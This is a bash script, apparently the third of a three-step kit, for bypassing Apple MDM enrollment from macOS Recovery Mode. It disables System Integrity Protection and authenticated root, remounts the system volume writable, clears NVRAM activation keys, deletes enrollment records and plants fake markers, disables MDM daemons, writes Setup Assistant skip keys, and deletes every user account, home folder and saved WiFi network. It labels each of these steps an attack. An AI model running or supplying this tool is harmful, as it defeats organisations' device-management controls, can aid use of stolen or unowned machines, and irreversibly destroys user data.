#!/bin/bash

# Bypass MDM - Clean Setup (Step 3 of 3)
# Run from Recovery Mode AFTER Step 2.
# Multi-pronged MDM bypass with SSV (Signed System Volume) unlock.

RED='\033[1;31m'
GRN='\033[1;32m'
BLU='\033[1;34m'
YEL='\033[1;33m'
CYAN='\033[1;36m'
NC='\033[0m'

printf "\n"
printf "${CYAN}╔═══════════════════════════════════════════════════╗${NC}\n"
printf "${CYAN}║  MDM Bypass - Clean Setup (Step 3 of 3)          ║${NC}\n"
printf "${CYAN}║  Run from Recovery Mode                          ║${NC}\n"
printf "${CYAN}╚═══════════════════════════════════════════════════╝${NC}\n"
printf "\n"

# ═══════════════════════════════════════════════════════
# PHASE 0: Mount and prepare volumes
# ═══════════════════════════════════════════════════════
printf "${YEL}[0] Mounting volumes...${NC}\n"

# Make sure volumes are mounted
diskutil mount "Macintosh HD" 2>/dev/null
diskutil mount "Macintosh HD - Data" 2>/dev/null
diskutil mount "Data" 2>/dev/null

# Normalize Data volume
if [ -d "/Volumes/Macintosh HD - Data" ]; then
	diskutil rename "Macintosh HD - Data" "Data" 2>/dev/null
fi

if [ ! -d "/Volumes/Data" ]; then
	printf "${RED}ERROR: /Volumes/Data not found. Is macOS installed?${NC}\n"
	exit 1
fi

printf "${GRN}  ✓ Data volume ready${NC}\n"

# Check if system volume is accessible
if [ ! -d "/Volumes/Macintosh HD" ]; then
	printf "${YEL}  ⚠ System volume not mounted at /Volumes/Macintosh HD${NC}\n"
	SYS_AVAILABLE=false
else
	printf "${GRN}  ✓ System volume accessible${NC}\n"
	SYS_AVAILABLE=true
fi
printf "\n"

# ═══════════════════════════════════════════════════════
# PHASE 1: Unlock the system volume (disable SSV/SIP)
# Without this, ALL writes to the system volume silently
# fail. This is why our previous attacks didn't work.
# ═══════════════════════════════════════════════════════
printf "${YEL}[1] Unlocking system volume protection...${NC}\n"
printf "${BLU}  This disables SIP and authenticated root so we can${NC}\n"
printf "${BLU}  modify system files. We'll re-enable after setup.${NC}\n"
printf "\n"

# Disable SIP
csrutil disable 2>/dev/null
sip_status=$(csrutil status 2>/dev/null)
if echo "$sip_status" | grep -q "disabled"; then
	printf "${GRN}  ✓ SIP disabled${NC}\n"
else
	printf "${YEL}  ⚠ Could not disable SIP — system volume writes may fail${NC}\n"
fi

# Disable authenticated root (SSV)
csrutil authenticated-root disable 2>/dev/null
printf "${GRN}  ✓ Authenticated root disabled${NC}\n"

# Try to mount system volume read-write
if [ "$SYS_AVAILABLE" = true ]; then
	mount -uw "/Volumes/Macintosh HD" 2>/dev/null
	if touch "/Volumes/Macintosh HD/.rw_test" 2>/dev/null; then
		rm -f "/Volumes/Macintosh HD/.rw_test"
		printf "${GRN}  ✓ System volume mounted read-write${NC}\n"
		SYS_WRITABLE=true
	else
		printf "${YEL}  ⚠ System volume still read-only (may need reboot into Recovery)${NC}\n"
		SYS_WRITABLE=false
	fi
else
	SYS_WRITABLE=false
fi
printf "\n"

# ═══════════════════════════════════════════════════════
# ATTACK 1: Clear NVRAM
# On Intel/T2 Macs, DEP record may live in NVRAM.
# On Apple Silicon, this clears user NVRAM vars but
# won't touch the SEP-stored activation record.
# ═══════════════════════════════════════════════════════
printf "${YEL}[2] Clearing NVRAM...${NC}\n"
nvram -c 2>/dev/null && printf "${GRN}  ✓ NVRAM cleared${NC}\n" || printf "${BLU}  ℹ Could not clear NVRAM${NC}\n"
# Also try clearing specific known keys
nvram -d "com.apple.cloudconfig.activation-record" 2>/dev/null
nvram -d "enrollment-nonce" 2>/dev/null
printf "\n"

# ═══════════════════════════════════════════════════════
# ATTACK 2: Nuke ALL MDM/enrollment data
# ═══════════════════════════════════════════════════════
printf "${YEL}[3] Destroying MDM enrollment data...${NC}\n"

# Data volume (always writable)
data_profiles="/Volumes/Data/private/var/db/ConfigurationProfiles"
if [ -d "$data_profiles" ]; then
	rm -rf "$data_profiles/Settings/.cloudConfigHasActivationRecord" 2>/dev/null
	rm -rf "$data_profiles/Settings/.cloudConfigRecordFound" 2>/dev/null
	rm -rf "$data_profiles/Settings/.cloudConfigActivationRecord" 2>/dev/null
	rm -rf "$data_profiles/Store" 2>/dev/null
	mkdir -p "$data_profiles/Store" 2>/dev/null
	# Safe glob for enrollment files
	for f in "$data_profiles"/*.enrollment*; do
		[ -e "$f" ] && rm -rf "$f"
	done
fi
mkdir -p "$data_profiles/Settings" 2>/dev/null
touch "$data_profiles/Settings/.cloudConfigProfileInstalled" 2>/dev/null
touch "$data_profiles/Settings/.cloudConfigRecordNotFound" 2>/dev/null
printf "${GRN}  ✓ Data volume: MDM data destroyed, bypass markers set${NC}\n"

# System volume (only if writable)
if [ "$SYS_WRITABLE" = true ]; then
	sys_profiles="/Volumes/Macintosh HD/var/db/ConfigurationProfiles"
	if [ -d "$sys_profiles" ]; then
		rm -rf "$sys_profiles/Settings/.cloudConfigHasActivationRecord" 2>/dev/null
		rm -rf "$sys_profiles/Settings/.cloudConfigRecordFound" 2>/dev/null
		rm -rf "$sys_profiles/Settings/.cloudConfigActivationRecord" 2>/dev/null
		mkdir -p "$sys_profiles/Settings" 2>/dev/null
		touch "$sys_profiles/Settings/.cloudConfigProfileInstalled" 2>/dev/null
		touch "$sys_profiles/Settings/.cloudConfigRecordNotFound" 2>/dev/null
		printf "${GRN}  ✓ System volume: bypass markers set${NC}\n"
	fi
fi
printf "\n"

# ═══════════════════════════════════════════════════════
# ATTACK 3: Disable MDM enrollment daemons
# Rename daemon plists so launchd doesn't load them.
# Requires writable system volume (SSV disabled).
# ═══════════════════════════════════════════════════════
printf "${YEL}[4] Disabling MDM enrollment daemons...${NC}\n"

if [ "$SYS_WRITABLE" = true ]; then
	mdm_daemons=(
		# Modern macOS (Ventura+)
		"com.apple.cloudconfigurationd.plist"
		"com.apple.DeviceManagement.enrollmentd.plist"
		# Older/alternate names
		"com.apple.ManagedClient.cloudconfigurationd.plist"
		"com.apple.ManagedClient.enroll.plist"
		"com.apple.ManagedClient.plist"
		"com.apple.ManagedClient.startup.plist"
		"com.apple.mdmclient.daemon.plist"
		"com.apple.mdmclient.agent.plist"
		"com.apple.mdmclient.plist"
	)

	disabled_count=0
	for daemon in "${mdm_daemons[@]}"; do
		for dir in "/Volumes/Macintosh HD/System/Library/LaunchDaemons" "/Volumes/Macintosh HD/System/Library/LaunchAgents"; do
			if [ -f "$dir/$daemon" ]; then
				mv "$dir/$daemon" "$dir/${daemon}.disabled" 2>/dev/null
				if [ $? -eq 0 ]; then
					printf "${GRN}  ✓ Disabled: $daemon${NC}\n"
					disabled_count=$((disabled_count + 1))
				fi
			fi
		done
	done

	if [ $disabled_count -eq 0 ]; then
		printf "${YEL}  ⚠ No daemons found to disable (names may differ on Tahoe)${NC}\n"
	fi
else
	printf "${YEL}  ⚠ Skipped — system volume is read-only${NC}\n"
	printf "${BLU}  To fix: reboot into Recovery, run this script again.${NC}\n"
	printf "${BLU}  SIP disable may need a reboot to take effect.${NC}\n"
fi
printf "\n"

# ═══════════════════════════════════════════════════════
# ATTACK 4: Managed preferences skip keys
# Write to the CORRECT path that macOS reads.
# ═══════════════════════════════════════════════════════
printf "${YEL}[5] Writing Setup Assistant skip keys...${NC}\n"

# Correct managed preferences path (on Data volume)
managed_dir="/Volumes/Data/Library/Managed Preferences"
mkdir -p "$managed_dir" 2>/dev/null

# Filename is com.apple.SetupAssistant.plist (NOT .managed.plist)
cat > "$managed_dir/com.apple.SetupAssistant.plist" << 'SKIPEOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>SkipCloudSetup</key>
	<true/>
	<key>SkipDeviceManagement</key>
	<true/>
	<key>DidSeeCloudSetup</key>
	<true/>
</dict>
</plist>
SKIPEOF
printf "${GRN}  ✓ Skip keys written to Managed Preferences${NC}\n"

# Also try in the standard Library/Preferences
data_prefs="/Volumes/Data/Library/Preferences"
mkdir -p "$data_prefs" 2>/dev/null
cp "$managed_dir/com.apple.SetupAssistant.plist" "$data_prefs/com.apple.SetupAssistant.plist" 2>/dev/null

# If system volume is writable, write there too
if [ "$SYS_WRITABLE" = true ]; then
	sys_managed="/Volumes/Macintosh HD/Library/Managed Preferences"
	mkdir -p "$sys_managed" 2>/dev/null
	cp "$managed_dir/com.apple.SetupAssistant.plist" "$sys_managed/" 2>/dev/null
	printf "${GRN}  ✓ Skip keys written to system volume${NC}\n"
fi
printf "\n"

# ═══════════════════════════════════════════════════════
# ATTACK 5: Clear WiFi networks
# ═══════════════════════════════════════════════════════
printf "${YEL}[6] Clearing saved WiFi networks...${NC}\n"

rm -f "/Volumes/Data/private/var/db/SystemConfiguration/com.apple.wifi.known-networks.plist" 2>/dev/null
rm -f "/Volumes/Data/Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist" 2>/dev/null
rm -f "/Volumes/Data/Library/Preferences/SystemConfiguration/com.apple.wifi.message-tracer.plist" 2>/dev/null
printf "${GRN}  ✓ WiFi networks cleared${NC}\n"
printf "\n"

# ═══════════════════════════════════════════════════════
# CLEANUP: Delete all users & remove .AppleSetupDone
# ═══════════════════════════════════════════════════════
printf "${YEL}[7] Deleting all user accounts...${NC}\n"

DSLOCAL="/Volumes/Data/private/var/db/dslocal/nodes/Default/users"
deleted=0
for plist in "$DSLOCAL"/*.plist; do
	[ -f "$plist" ] || continue
	username=$(basename "$plist" .plist)
	case "$username" in
		_*|root|daemon|nobody|Guest) continue ;;
	esac
	printf "  ${YEL}Deleting: $username${NC}\n"
	rm -f "$plist"
	rm -rf "/Volumes/Data/Users/$username" 2>/dev/null
	deleted=$((deleted + 1))
done

if [ $deleted -gt 0 ]; then
	printf "${GRN}  ✓ Deleted $deleted account(s)${NC}\n"
else
	printf "${BLU}  ℹ No accounts to delete${NC}\n"
fi

rm -f /Volumes/Data/private/var/db/.AppleSetupDone 2>/dev/null
printf "${GRN}  ✓ Removed .AppleSetupDone${NC}\n"
printf "\n"

# ═══════════════════════════════════════════════════════
# SNAPSHOT: If we modified the system volume, bless it
# ═══════════════════════════════════════════════════════
if [ "$SYS_WRITABLE" = true ]; then
	printf "${YEL}[8] Blessing modified system volume...${NC}\n"
	bless --folder "/Volumes/Macintosh HD/System/Library/CoreServices" --bootefi --create-snapshot 2>/dev/null
	if [ $? -eq 0 ]; then
		printf "${GRN}  ✓ System volume snapshot created${NC}\n"
	else
		printf "${YEL}  ⚠ Could not create snapshot — changes may not persist${NC}\n"
	fi
	printf "\n"
fi

# ═══════════════════════════════════════════════════════
printf "${GRN}╔═══════════════════════════════════════════════════╗${NC}\n"
printf "${GRN}║       All attacks deployed.                       ║${NC}\n"
printf "${GRN}╚═══════════════════════════════════════════════════╝${NC}\n"
printf "\n"

if [ "$SYS_WRITABLE" != true ]; then
	printf "${YEL}NOTE: System volume was read-only. The SIP/SSV disable${NC}\n"
	printf "${YEL}may need a reboot to take effect. If MDM still appears:${NC}\n"
	printf "${YEL}  1. Reboot into Recovery Mode again${NC}\n"
	printf "${YEL}  2. Run this script a second time${NC}\n"
	printf "${YEL}  (The system volume should be writable on the 2nd run)${NC}\n"
	printf "\n"
fi

printf "${CYAN}Close this terminal and restart your Mac.${NC}\n"
printf "\n"
printf "${CYAN}After setup is complete, re-enable SIP from Recovery:${NC}\n"
printf "  ${GRN}csrutil enable${NC}\n"
printf "  ${GRN}csrutil authenticated-root enable${NC}\n"
printf "\n"
